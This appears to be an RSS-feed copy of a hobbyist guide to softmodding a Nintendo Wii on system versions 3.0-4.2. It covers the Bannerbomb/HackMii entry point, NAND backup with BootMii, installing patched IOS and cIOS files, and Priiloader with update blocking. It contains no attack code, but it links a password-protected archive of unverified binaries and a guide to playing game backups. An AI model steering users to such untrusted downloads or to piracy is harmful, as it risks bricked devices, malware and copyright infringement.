&lt;li&gt;Jailbreak file [4.2] – &lt;a href=&quot;http://www.mediafire.com/?9ulaa2elqvu7z4z&quot;&gt;Mediafire&lt;/a&gt; (Password is &lt;code&gt;wiihacks&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;SD card with 1GB or more.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Preparation&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Format your SD card to FAT32 or FAT16&lt;/li&gt;
&lt;li&gt;Make Sure WiiConnect 24 is OFF&lt;/li&gt;
&lt;li&gt;Unzip the previously downloaded jailbreak pack and place the files/folders onto the root of your SD card.&lt;/li&gt;
&lt;li&gt;Always launch md5summer.exe to verify that the files have been downloaded properly and they are not corrupted.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Step 1 – Installing Homebrew Channel and Bootmii&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;[3.0-4.1]&lt;/strong&gt; Go to Wii Options, then go to &lt;code&gt;Data Management -&amp;gt; Channels -&amp;gt; SD Card&lt;/code&gt;, click on &lt;code&gt;Bannerbomb channel&lt;/code&gt;, you will get a message saying &amp;quot;Load boot.elf/dol?&amp;quot;, select &amp;#39;Yes&amp;#39; and the Hackmii installer will run.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;[4.2]&lt;/strong&gt; Click the SD Card Icon on the Wii Menu – &amp;quot;Load boot.elf/dol?&amp;quot;, select &amp;#39;Yes&amp;#39; and the Hackmii installer will run.&lt;/p&gt;
&lt;p&gt;In the Hackmii Installer, make sure to install the Homebrew Channel. If you can, also install Bootmii as boot2. When installing bootmii select prepare SD card, then install. &amp;quot;Bootmii as IOS&amp;quot; is installed automatically.&lt;/p&gt;
&lt;p&gt;(If you receive an error stating “No vulnerable IOS”, &lt;a href=&quot;http://www.wiihacks.com/recommended-faqs-guides-tutorials-only/29080-hackmii-fix-no-vulnerable-ios-black-screen-scam-freeze.html&quot;&gt;complete these steps&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 2 – Backup Your Wii&amp;#39;s NAND (required)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;It is highly recommended to make a NAND Backup with bootmii as it can save you from 99% of bricks. That is, if you can install bootmii as boot2. You&amp;#39;ll need a SD Card with at least 550 MB free on it. Also, note bootmii can be picky about SD Cards so its best to avoid generic ones. The 2GB Sandisk SD Card is recommended.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;a)&lt;/strong&gt; Place the SD Card into your wii and power it on. If bootmii was installed as boot2, the bootmii screen should automatically appear, if it was installed as an IOS, then you&amp;#39;ll have to go to homebrew channel, press &amp;quot;home&amp;quot; on your wiimote then select &amp;quot;Launch Bootmii&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;b)&lt;/strong&gt; Navigate using the power/reset buttons on the front of your console and select the icon with the gears on it. If the console buttons don&amp;#39;t work, you&amp;#39;ll have to use a gamecube controller.&lt;/p&gt;
&lt;p&gt;Power = Browse
Reset = Select&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;c)&lt;/strong&gt; Now select the icon that has the Green arrow pointing to a SD Card but from the chip. Then follow the on-screen instructions to backup your NAND.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;d)&lt;/strong&gt; In 10 – 15 minutes, the NAND Backup should be complete. You may get a few bad blocks but any number of bad blocks under 80 is normal and fine. Once all is done, you can exit bootmii.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;e)&lt;/strong&gt; Remove the SD Card from your wii and insert into your PC, backup the &amp;#39;bootmii&amp;#39; folder, the &amp;#39;NAND.bin&amp;#39; file and &amp;#39;key.bin&amp;#39; file from your sd card onto a safe place on your PC. Once these files/folders are on your PC, delete them from your SD Card. If you do not and bootmii as boot2 is installed, it will load everytime!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DO NOT LOSE YOUR NAND.BIN OR KEYS.BIN&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;If you were to ever fully brick the wii, just copy the bootmii folder and &amp;#39;NAND.bin&amp;#39; from your PC onto the root of your SD Card. Then repeat parts &lt;code&gt;a&lt;/code&gt;, &lt;code&gt;b&lt;/code&gt; &amp;amp; &lt;code&gt;c&lt;/code&gt; but this time selecting the icon that points to the chip. While &lt;code&gt;bootmii&lt;/code&gt;/&lt;code&gt;boot2&lt;/code&gt; can save you from full bricks, &lt;code&gt;bootmii&lt;/code&gt;/&lt;code&gt;IOS&lt;/code&gt; cannot! It is not recommended to use &lt;code&gt;bootmii&lt;/code&gt; as an &lt;code&gt;IOS&lt;/code&gt; to restore your NAND! If you can only install as an &lt;code&gt;IOS&lt;/code&gt;, your nand backup is still useful, keep it safe.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 3 – Modding your Wii (the jailbreak)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;[3.0-4.1 Only]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;a)&lt;/strong&gt; Put the SD card into the Wii&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;b)&lt;/strong&gt; Open The Homebrew channel and select Multi-Mod Manager. Go to &lt;code&gt;Install &amp;amp; Patch iOS36 -&amp;gt; Express Install&lt;/code&gt; - When completed press &lt;code&gt;B&lt;/code&gt; to go back into main menu go to the bottom choice &lt;code&gt;Load Another IOS&lt;/code&gt; and select &lt;code&gt;IOS236&lt;/code&gt; (this should already be selected).&lt;/p&gt;
&lt;p&gt;In Multi-Mod Manager go into &lt;code&gt;Wad Manager&lt;/code&gt;, it should display these wads.&lt;/p&gt;
&lt;p&gt;(These are to softmod your Wii)&lt;/p&gt;
&lt;p&gt;  iOS60-[6174]-Patched.wad
  cIOS249[56]-rev20.wad
  cIOS250[57]-rev65535.wad
  cIOS223[37+38]-rev4.wad
  cIOS222[38]-rev4.wad&lt;/p&gt;
&lt;p&gt;(These are to install the extra IOS files)&lt;/p&gt;
&lt;p&gt;  iOS53-64-v5663.wad
  iOS55-64-v5663.wad
  iOS56-64-v5662.wad
  iOS57-64-v5919.wad
  iOS58-64-v6176.wad&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;c)&lt;/strong&gt; Press 1 on Wiimote to install all these wads at once, Press A to confirm. If you get an error do not exit until they all install correctly. Retry installing&lt;/p&gt;
&lt;p&gt;After it installs correctly press the HOME button on Wiimote until you&amp;#39;re back in main Multi-Mod Manager Menu.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;[4.2 Only]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;a)&lt;/strong&gt; SD card in the Wii
&lt;strong&gt;b)&lt;/strong&gt; Open The Homebrew channel and select Multi-Mod Manager. Go to &lt;code&gt;Install &amp;amp; Patch iOS36 -&amp;gt; Express Install&lt;/code&gt; - Once completed press B to go back into main menu go to the bottom choice &lt;code&gt;Load Another IOS&lt;/code&gt; and select &lt;code&gt;IOS236&lt;/code&gt; (this should already be selected).&lt;/p&gt;
&lt;p&gt;In Multi-Mod Manager go into Wad Manager, it should display these wads.&lt;/p&gt;
&lt;p&gt;(These are to softmod your wii)&lt;/p&gt;
&lt;p&gt;  iOS70-[6687]-Patched.wad
  cIOS249[56]-rev20.wad
  cIOS250[57]-rev65535.wad
  cIOS222[38]-rev4.wad
  cIOS223[37+38]-rev4.wad&lt;/p&gt;
&lt;p&gt;(These are the IOS your Wii needs)&lt;/p&gt;
&lt;p&gt;  iOS56-64-v5662.wad
  iOS57-64-v5919.wad
  iOS58-64-v6176.wad&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;c)&lt;/strong&gt; Press 1 on wiimote to install all these wads at once, Press A to confirm. If you get an error do not exit until they install correctly. Retry installing.&lt;/p&gt;
&lt;p&gt;After they have all installed correctly press the B button on Wiimote until you&amp;#39;re back in main Multi-Mod Manager Menu.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 4 – Installing Priiloader&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HBC -&amp;gt; Load up MMM&lt;/code&gt;. Make sure where it says Load another ios [IOS236 is Selected]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;a)&lt;/strong&gt; &lt;code&gt;Multi-Mod Manager -&amp;gt; App Manager -&amp;gt; Select Priiloader&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;b)&lt;/strong&gt; It Should Load up Press + to Install&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;c)&lt;/strong&gt; Your Wii should reboot into Homebrew Channel after the installation. Press the HOME button and power off your Wii. Hold reset on the console while turning it on to boot into Priiloader. Go to System Menu Hacks and enable &amp;#39;Block Disc Updates&amp;#39; &amp;amp; &amp;#39;Block Online Updates&amp;#39;, select &amp;#39;Save Settings&amp;#39; when finished. Press B on the Wiimote to go back to the main menu, next go to Settings and use the d-pad to set Autoboot: System Menu. Then select Save Settings. Press B to go back to the main menu.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;d)&lt;/strong&gt; In the main menu in priiloader, select Launch Title and select the HomeBrew Channel to check if its working properly.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 5 – Getting HBC to use iOS58 for USB2 Support&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;From the Homebrew channel load up the hackmii installer and reinstall the Homebrew channel. This will make it use ios58 for USB2 Support.To check your HBC is using iOS58 press the home button when in HBC and it should tell you in top right corner.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 6 – Install more apps&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is what the whole jailbreak process was for, installing custom apps. Here is a list of some awesome apps, starting at my favourite.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.wiimc.org/downloads/&quot;&gt;WiiMC&lt;/a&gt; – Wii Media Center&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.wiihacks.com/other-faq-guides-tutorials/68251-guide-homebrew-browser.html&quot;&gt;Homebrew Browser&lt;/a&gt; - Wii Homebrew App Store&lt;/li&gt;
&lt;li&gt;Update the &lt;a href=&quot;http://www.wiihacks.com/general-homebrew-hack-issues/67034-update-shopping-channel-v20-guide.html&quot;&gt;Wii Shopping Channel&lt;/a&gt; to v20&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.wiihacks.com/recommended-faqs-guides-tutorials-only/47802-play-gamecube-backups-your-wii.html&quot;&gt;Play Gamecube games&lt;/a&gt; on your Wii&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.wiihacks.com/emulators-downloads/&quot;&gt;Emulators&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.wiihacks.com/other-faq-guides-tutorials/66235-ftpii-guide.html&quot;&gt;Wii FTP&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;And you are done!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Special thanks to author, &lt;em&gt;Cile&lt;/em&gt;, for the original guide over at &lt;a href=&quot;http://www.wiihacks.com/recommended-faqs-guides-tutorials-only/69690-softmod-3-0-4-2-e-u-j-wiis.html&quot;&gt;WiiHacks&lt;/a&gt;.&lt;/p&gt;
</description></item></channel></rss>